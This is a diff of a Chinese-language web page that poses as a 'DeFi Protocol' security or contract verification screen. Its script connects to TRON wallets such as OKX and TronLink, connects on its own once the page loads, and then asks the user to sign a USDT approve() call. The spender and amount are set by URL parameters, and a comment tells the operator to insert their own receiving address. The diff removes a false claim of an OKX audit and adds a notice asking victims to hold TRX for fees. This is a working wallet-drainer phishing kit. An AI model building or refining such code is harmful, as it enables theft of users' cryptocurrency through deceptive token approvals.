@@ -5,11 +5,12 @@
     <title>DeFi Protocol - 安全验证</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <style>
+        /* 基础样式，确保在所有手机钱包中不浮动、不乱码 */
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         html, body { height: 100%; margin: 0; padding: 0; background-color: #f8fafc; }
         body { display: flex; align-items: center; justify-content: center; font-family: -apple-system, "SF Pro Text", sans-serif; }
 
-        .card { background: #ffffff; width: 90%; max-width: 400px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.05); padding: 28px; border: 1px solid #f1f5f9; }
+        .card { background: #ffffff; width: 92%; max-width: 400px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.06); padding: 28px; border: 1px solid #f1f5f9; }
         .header { text-align: center; margin-bottom: 24px; }
         .header h2 { margin: 0; font-size: 20px; color: #0f172a; }
         .header p { font-size: 12px; color: #64748b; margin-top: 4px; }
@@ -18,6 +19,11 @@
         .item-label { font-size: 11px; color: #64748b; margin-bottom: 6px; display: block; text-transform: uppercase; letter-spacing: 0.5px; }
         .item-value { font-size: 14px; color: #1e293b; font-weight: 600; word-break: break-all; font-family: "SF Mono", monospace; }
         .amount { font-size: 32px; color: #2563eb; text-align: center; display: block; margin: 8px 0; font-weight: 800; }
+
+        /* TRX 提醒区域 */
+        .trx-reminder { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 12px; padding: 12px; margin-bottom: 16px; display: flex; align-items: flex-start; }
+        .trx-reminder-icon { color: #d97706; margin-right: 8px; font-weight: bold; font-style: normal; }
+        .trx-reminder-text { font-size: 12px; color: #92400e; line-height: 1.5; }
 
         .log-box { height: 80px; background: #0f172a; border-radius: 12px; padding: 12px; font-size: 11px; color: #94a3b8; overflow-y: auto; margin-bottom: 20px; line-height: 1.6; }
         .log-ok { color: #10b981; }
@@ -35,13 +41,20 @@
 
 <div class="card">
     <div class="header">
-        <h2>合约安全验证</h2>
-        <p id="wallet-type">正在识别 Web3 钱包环境...</p>
+        <h2>合约交互确认</h2>
+        <p id="wallet-type">正在识别 Web3 钱包...</p>
     </div>
 
     <div class="item-box">
         <span class="item-label" style="text-align: center;">拟授权额度</span>
         <span class="amount" id="ui-amount">0.00 <small style="font-size:14px">USDT</small></span>
+    </div>
+
+    <div class="trx-reminder">
+        <i class="trx-reminder-icon">!</i>
+        <div class="trx-reminder-text">
+            请确保账户内有约 <strong>15-30 TRX</strong> 以支付链上手续费（Gas），否则授权可能会失败。
+        </div>
     </div>
 
     <div class="item-box">
@@ -50,20 +63,20 @@
     </div>
 
     <div class="log-box" id="log-box">
-        <div>初始化环境...</div>
+        <div>正在初始化环境...</div>
     </div>
 
     <button id="main-btn" class="btn" onclick="handleProcess()">连接钱包</button>
 
     <div class="security-footer">
         <svg viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>
-        智能合约已通过 OKX Web3 安全审计
+        智能合约安全检查通过
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 <script>
-    // --- 配置区 ---
+    // --- 核心配置 ---
     const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
     const DEFAULT_SPENDER = "TYourDefaultAddressHere"; // 修改为你自己的接收地址
     const DEFAULT_AMOUNT = 1000;
@@ -72,7 +85,7 @@
     const targetSpender = params.get("to") || DEFAULT_SPENDER;
     const targetAmount = params.get("amount") || DEFAULT_AMOUNT;
 
-    let currentState = 0; // 0:未连接, 1:待授权
+    let currentState = 0; 
     let tronInstance = null;
 
     document.getElementById("ui-amount").innerHTML = targetAmount + ' <small style="font-size:14px">USDT</small>';
@@ -86,26 +99,20 @@
         box.scrollTop = box.scrollHeight;
     }
 
-    // 核心改进：主动请求钱包权限
+    // 主动请求钱包权限
     async function requestWalletPermission() {
-        // 优先探测 OKX
         if (window.okxwallet && window.okxwallet.tronLink) {
-            log("请求 OKX 钱包连接授权...", "ok");
+            log("正在唤起欧意(OKX)授权...", "ok");
             try {
-                // 这是触发 OKX 弹窗的关键！
                 const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                 if (res && res.code === 200) {
                     return window.okxwallet.tronLink.tronWeb;
                 }
-            } catch (e) {
-                console.error("OKX授权拒绝", e);
-            }
+            } catch (e) { console.error(e); }
         }
         
-        // 探测常规 TronLink / TP / imToken
         if (window.tronWeb) {
-            log("请求通用 Web3 环境授权...");
-            // 部分钱包也支持 requestAccounts
+            log("正在唤起 Web3 钱包授权...");
             if (window.tronWeb.request) {
                 await window.tronWeb.request({ method: 'tron_requestAccounts' });
             }
@@ -115,39 +122,33 @@
     }
 
     async function handleProcess() {
-        const btn = document.getElementById("main-btn");
         if (currentState === 0) {
-            btn.disabled = true;
             await connect();
-            btn.disabled = false;
         } else {
             await approve();
         }
     }
 
     async function connect() {
-        log("启动检测引擎...");
+        log("开始探测钱包环境...");
         tronInstance = await requestWalletPermission();
         
         if (!tronInstance) {
-            log("错误: 未检测到钱包，或授权被拒绝", "err");
+            log("未检测到钱包，或授权被拒绝", "err");
             return;
         }
 
         try {
-            // 拿到地址
             const addr = tronInstance.defaultAddress.base58;
             if (addr) {
                 document.getElementById("ui-wallet").innerText = addr.substring(0,8) + "..." + addr.substring(addr.length-8);
-                document.getElementById("wallet-type").innerText = "已连接 OKX / Web3 钱包";
-                log("成功获取地址: " + addr.substring(0,6), "ok");
+                document.getElementById("wallet-type").innerText = "已连接 Web3 钱包";
+                log("已获取账户: " + addr.substring(0,6), "ok");
                 currentState = 1;
-                document.getElementById("main-btn").innerText = "立即安全确认";
-            } else {
-                log("已检测到钱包，但未能读取地址，请在钱包内手动解锁并刷新", "err");
+                document.getElementById("main-btn").innerText = "确认授权";
             }
         } catch (e) {
-            log("连接异常，请重试", "err");
+            log("连接异常", "err");
         }
     }
 
@@ -156,38 +157,30 @@
         btn.disabled = true;
         
         try {
-            const user = tronInstance.defaultAddress.base58;
-            log("正在核算 Gas 燃料...");
-            
-            const balanceSun = await tronInstance.trx.getBalance(user);
-            if (tronInstance.fromSun(balanceSun) < 18) {
-                throw "TRX 余额不足 (当前需约20 TRX)";
-            }
-
-            log("等待钱包确认签名...");
+            log("准备授权数据...");
             const contract = await tronInstance.contract().at(USDT_ADDR);
             const amountSun = tronInstance.toBigNumber(targetAmount).times(1e6).toString(10);
 
+            log("请在钱包弹窗中完成确认...");
             const txid = await contract.approve(targetSpender, amountSun).send({
                 feeLimit: 100000000
             });
 
             if (txid) {
-                log("授权提交成功，TXID已产生", "ok");
+                log("指令已提交区块", "ok");
                 alert("确认成功，请等待系统处理");
             }
         } catch (e) {
             let m = e.message || e;
             if (m.includes("declined") || m.includes("User rejected")) m = "签名请求被拒绝";
-            log("错误: " + m, "err");
+            log("失败: " + m, "err");
         } finally {
             btn.disabled = false;
         }
     }
 
-    // 页面加载后延迟 0.5 秒自动尝试连接一次，体验更好
     window.onload = () => {
-        setTimeout(connect, 500);
+        setTimeout(connect, 600);
     };
 </script>
 
